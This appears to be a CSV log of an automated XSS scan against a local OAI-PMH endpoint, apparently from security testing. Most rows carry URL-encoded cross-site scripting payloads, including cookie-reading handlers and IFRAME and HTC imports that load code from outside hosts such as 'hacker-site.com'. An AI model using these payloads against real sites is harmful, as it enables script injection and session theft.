uuid,timestamp,http_status_code,request_url,response_time,http_version
cc0eea73-d126-44b7-8ead-220d989281db,2025-01-02 01:03:33,403,http://localhost:8081/oai/request?verb=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-,2095.99 ms,HTTP/1.1
a834b179-085f-493d-8f84-02e5e38c68dc,2025-01-02 01:03:35,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2127.36 ms,HTTP/1.1
cfef131b-8107-4d21-847f-f9d31738cb86,2025-01-02 01:03:38,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-,2142.77 ms,HTTP/1.1
db5e1098-da62-44c9-80e1-6ac3c5c8f748,2025-01-02 01:03:40,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-&set=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-,2157.62 ms,HTTP/1.1
0eeb84c1-affa-4441-a3eb-3c82d8d0c11a,2025-01-02 01:03:42,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-&set=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-,2135.13 ms,HTTP/1.1
d9825eca-b078-4f4d-88e0-30dcaa531ccb,2025-01-02 01:03:45,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-&metadataPrefix=marc,2114.47 ms,HTTP/1.1
ba1b48ec-21cc-4231-8a8c-a49d57766667,2025-01-02 01:03:47,403,http://localhost:8081/oai/request?verb=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22%25%28htc%29s%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E%22%22%22%2C%22XML+namespace.%22%29%2C%28%22%22%22%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Ajavascript%3Aalert%281%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E,2091.10 ms,HTTP/1.1
90dcf3b1-6af9-4f14-8b5b-3868dde19aa6,2025-01-02 01:03:50,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2092.70 ms,HTTP/1.1
e94a4e1a-e8c9-4f59-955d-66aa801f85be,2025-01-02 01:03:52,200,http://localhost:8081/oai/request?verb=ListSets,2102.34 ms,HTTP/1.1
18a92298-ff94-4433-9fe4-3954229cc371,2025-01-02 01:03:54,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22%25%28htc%29s%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E%22%22%22%2C%22XML+namespace.%22%29%2C%28%22%22%22%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Ajavascript%3Aalert%281%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E,2162.44 ms,HTTP/1.1
a3a829ac-c7bc-4e73-8d2e-6072c34cdc80,2025-01-02 01:03:57,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22%25%28htc%29s%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E%22%22%22%2C%22XML+namespace.%22%29%2C%28%22%22%22%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Ajavascript%3Aalert%281%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E&set=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22%25%28htc%29s%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E%22%22%22%2C%22XML+namespace.%22%29%2C%28%22%22%22%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Ajavascript%3Aalert%281%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E,2129.69 ms,HTTP/1.1
8d850a78-54ec-4849-b576-3230a3d0c37a,2025-01-02 01:03:59,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22%25%28htc%29s%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E%22%22%22%2C%22XML+namespace.%22%29%2C%28%22%22%22%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Ajavascript%3Aalert%281%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E&metadataPrefix=marc,2156.89 ms,HTTP/1.1
dce21018-90a2-4b3c-8df1-0b8106191860,2025-01-02 01:04:02,403,http://localhost:8081/oai/request?verb=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E,2084.59 ms,HTTP/1.1
700269eb-63d1-447e-be88-67e13f2c3e95,2025-01-02 01:04:04,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E,2182.33 ms,HTTP/1.1
05b2bfb4-4d4c-4ed0-974f-9f4f52623e91,2025-01-02 01:04:06,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E,2127.13 ms,HTTP/1.1
d075c39f-f1b3-4b4c-8b11-c8420249f748,2025-01-02 01:04:09,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E&until=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E,2096.86 ms,HTTP/1.1
32c467d7-9fad-4598-a949-f1f799ec6852,2025-01-02 01:04:11,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E,2139.20 ms,HTTP/1.1
da989892-c1db-45c0-b133-499b0b8219de,2025-01-02 01:04:14,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E&metadataPrefix=oai_dc,2166.53 ms,HTTP/1.1
38c11286-5c3d-41ec-87ce-8a1ad7252e2d,2025-01-02 01:04:16,403,http://localhost:8081/oai/request?verb=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,2082.14 ms,HTTP/1.1
b128518c-80d9-4f3d-b2e1-6c7470a112f5,2025-01-02 01:04:18,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2098.99 ms,HTTP/1.1
1bb15e64-07df-4c06-94a0-7d3a3bf8d052,2025-01-02 01:04:21,200,http://localhost:8081/oai/request?verb=ListSets,2091.61 ms,HTTP/1.1
87266db4-3a2a-4671-acc4-5d6023085965,2025-01-02 01:04:23,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,2155.94 ms,HTTP/1.1
e1bb74d4-b75d-42d4-878b-41df15de43cc,2025-01-02 01:04:26,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,2133.42 ms,HTTP/1.1
695411cc-cdc6-46d6-b3de-d3b5db4f2d7f,2025-01-02 01:04:28,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E&metadataPrefix=oai_dc,2131.50 ms,HTTP/1.1
4c826de3-eea3-4a20-99e3-0ee2e66b2942,2025-01-02 01:04:30,403,http://localhost:8081/oai/request?verb=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,2096.03 ms,HTTP/1.1
2e7277c0-6e1c-4ab8-b5b1-1ea659f116ba,2025-01-02 01:04:33,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2100.31 ms,HTTP/1.1
29499c38-4596-4027-b8a4-7e1378615470,2025-01-02 01:04:35,200,http://localhost:8081/oai/request?verb=ListSets,2125.80 ms,HTTP/1.1
51f6b59e-829d-45a7-bb32-ef6f27d47cc6,2025-01-02 01:04:38,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,2136.09 ms,HTTP/1.1
1b51dc2a-fe6d-42eb-bf8d-7258699c3104,2025-01-02 01:04:40,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E&set=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,2128.62 ms,HTTP/1.1
9d374a0b-74a9-4d54-a716-f2f0d85a830b,2025-01-02 01:04:42,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E&metadataPrefix=oai_dc,2139.38 ms,HTTP/1.1
7a516259-e8dd-4a2d-bee3-ec00572629c0,2025-01-02 01:04:45,403,http://localhost:8081/oai/request?verb=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E,2073.07 ms,HTTP/1.1
59ddf6aa-8a3a-4491-924a-f17d4d7c01dd,2025-01-02 01:04:47,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E,2156.07 ms,HTTP/1.1
6d4cf114-a0b2-4a61-8ca2-63025403d852,2025-01-02 01:04:50,200,http://localhost:8081/oai/request?verb=ListSets,2121.16 ms,HTTP/1.1
d2f1a3c5-8d66-4087-a32b-6d17c04353b5,2025-01-02 01:04:52,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2122.85 ms,HTTP/1.1
f0841e31-5b8f-45e4-9f3b-8cfef91663df,2025-01-02 01:04:54,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&until=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&set=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E,2140.51 ms,HTTP/1.1
5bcb5f7a-4e41-4beb-b5b5-8add91ea9061,2025-01-02 01:04:57,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&metadataPrefix=oai_dc,2099.76 ms,HTTP/1.1
a1130f57-1bc2-4287-9bdf-adbcb16f4075,2025-01-02 01:04:59,403,http://localhost:8081/oai/request?verb=%3CIFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fiframe%3E,2065.97 ms,HTTP/1.1
ae8a01b3-5094-41bc-a8ad-2443ebe67e7d,2025-01-02 01:05:02,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2140.61 ms,HTTP/1.1
8018c35c-27ca-479f-a078-80ae153e59a1,2025-01-02 01:05:04,200,http://localhost:8081/oai/request?verb=ListSets,2112.05 ms,HTTP/1.1
282d34fa-fff8-45d1-8efc-e184e691bb52,2025-01-02 01:05:06,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CIFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fiframe%3E&until=%3CIFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fiframe%3E&set=%3CIFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fiframe%3E,2113.50 ms,HTTP/1.1
7b6add1f-201a-44eb-8cdb-006d4506f6a9,2025-01-02 01:05:09,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3CIFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fiframe%3E&set=%3CIFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fiframe%3E,2111.08 ms,HTTP/1.1
6d84b948-4989-49e3-90ed-77139b08ef68,2025-01-02 01:05:11,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fiframe%3E&metadataPrefix=oai_dc,2116.55 ms,HTTP/1.1
e550fa0b-2748-47a6-a3e7-7cc046d3f510,2025-01-02 01:05:14,403,http://localhost:8081/oai/request?verb=%3CIFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FIFRAME%3E,2074.69 ms,HTTP/1.1
90334817-5794-44d2-9a5d-677a67b4c3df,2025-01-02 01:05:16,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2116.25 ms,HTTP/1.1
bbb6e158-5dcd-4367-9fb0-7cb74aa98788,2025-01-02 01:05:18,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CIFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FIFRAME%3E,2168.08 ms,HTTP/1.1
47089313-49f5-4071-a37f-e47f2ec3f09b,2025-01-02 01:05:21,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3CIFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FIFRAME%3E,2136.96 ms,HTTP/1.1
faa6e4c9-3160-414b-a6ae-ba2161af066a,2025-01-02 01:05:23,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3CIFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FIFRAME%3E,2108.91 ms,HTTP/1.1
a2ef48d4-232e-4276-9886-1ad921b09115,2025-01-02 01:05:26,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FIFRAME%3E&metadataPrefix=marc,2127.94 ms,HTTP/1.1
6aeb8fa6-f1be-4067-b3c8-fc516e851da6,2025-01-02 01:05:28,403,http://localhost:8081/oai/request?verb=%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E,2080.94 ms,HTTP/1.1
79bb4093-777b-44c6-acf4-9af881abf5fc,2025-01-02 01:05:30,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E,2106.95 ms,HTTP/1.1
e9c7f70a-b884-4169-bac9-30504744a337,2025-01-02 01:05:33,200,http://localhost:8081/oai/request?verb=ListSets,2126.61 ms,HTTP/1.1
bfe3e8ea-e570-4b15-8122-65d8bf15650d,2025-01-02 01:05:35,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E&until=%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E,2095.66 ms,HTTP/1.1
0bf83e14-16a6-4e4d-be2c-c97f1f58afb7,2025-01-02 01:05:38,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E&until=%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E,2171.67 ms,HTTP/1.1
aceb34a2-fb2d-47f5-81ba-2b7bdb2545dc,2025-01-02 01:05:40,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E&metadataPrefix=marc,2123.72 ms,HTTP/1.1
193959b7-7ffe-42df-9e8b-f484c2366fcd,2025-01-02 01:05:42,403,http://localhost:8081/oai/request?verb=%3CIFRAME+SRC%3D%E2%80%9Dhttp%3A%2F%2Fhacker-site.com%2Fxss.html%E2%80%9D%3E,2077.51 ms,HTTP/1.1
7e096c7b-ff8f-43d2-bd29-c27f31038859,2025-01-02 01:05:45,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2114.74 ms,HTTP/1.1
7304a6ef-42aa-4713-b830-c2fa59c45790,2025-01-02 01:05:47,200,http://localhost:8081/oai/request?verb=ListSets,2125.58 ms,HTTP/1.1
c292cf0d-6773-4fc1-9511-ab89a1d3692f,2025-01-02 01:05:50,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3CIFRAME+SRC%3D%E2%80%9Dhttp%3A%2F%2Fhacker-site.com%2Fxss.html%E2%80%9D%3E,2122.17 ms,HTTP/1.1
f3b3537c-1fe8-4360-a666-4193c368ba0e,2025-01-02 01:05:52,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2168.97 ms,HTTP/1.1
4e1113c8-5982-4c25-b933-ad9839668033,2025-01-02 01:05:54,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIFRAME+SRC%3D%E2%80%9Dhttp%3A%2F%2Fhacker-site.com%2Fxss.html%E2%80%9D%3E&metadataPrefix=marc,2111.59 ms,HTTP/1.1
9d21041e-6d5b-4446-ac89-42beda202a73,2025-01-02 01:05:57,403,http://localhost:8081/oai/request?verb=%3CIFRAME+width%3D%22420%22+height%3D%22315%22+frameborder%3D%220%22+onload%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E,2060.02 ms,HTTP/1.1
00096124-6c74-4865-8994-5bbe28e872db,2025-01-02 01:05:59,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2112.32 ms,HTTP/1.1
e20c0ea5-1b12-4af4-8e5a-6fbfc54d2d7b,2025-01-02 01:06:01,200,http://localhost:8081/oai/request?verb=ListSets,2099.48 ms,HTTP/1.1
756111b0-e080-4145-b442-f304d578480f,2025-01-02 01:06:04,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CIFRAME+width%3D%22420%22+height%3D%22315%22+frameborder%3D%220%22+onload%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E&set=%3CIFRAME+width%3D%22420%22+height%3D%22315%22+frameborder%3D%220%22+onload%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E,2134.30 ms,HTTP/1.1
13c77e7b-8653-41c1-9d2e-883bd975c509,2025-01-02 01:06:06,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3CIFRAME+width%3D%22420%22+height%3D%22315%22+frameborder%3D%220%22+onload%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E,2111.25 ms,HTTP/1.1
